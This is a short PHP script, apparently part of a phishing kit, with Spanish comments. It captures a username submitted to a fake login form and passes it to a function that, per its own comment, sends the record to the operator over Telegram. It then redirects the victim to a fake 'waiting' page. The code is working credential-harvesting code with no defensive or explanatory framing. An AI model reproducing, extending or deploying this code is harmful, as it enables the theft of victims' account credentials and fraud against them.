<?php
require('../panel/lib/funciones.php');

// Capturamos el usuario del formulario
$usr = isset($_POST['usr']) ? $_POST['usr'] : (isset($_POST['txtUsuario']) ? $_POST['txtUsuario'] : 'Desconocido');
$dis = "Android Mobile"; // Simplificamos para que se vea bien en Telegram

// La función crear_registro ya envía el Telegram, así que solo la llamamos
crear_registro($usr, $dis);

// Redirigimos a la pantalla de carga/espera
header("Location: ../simulate/espera.php");
exit();
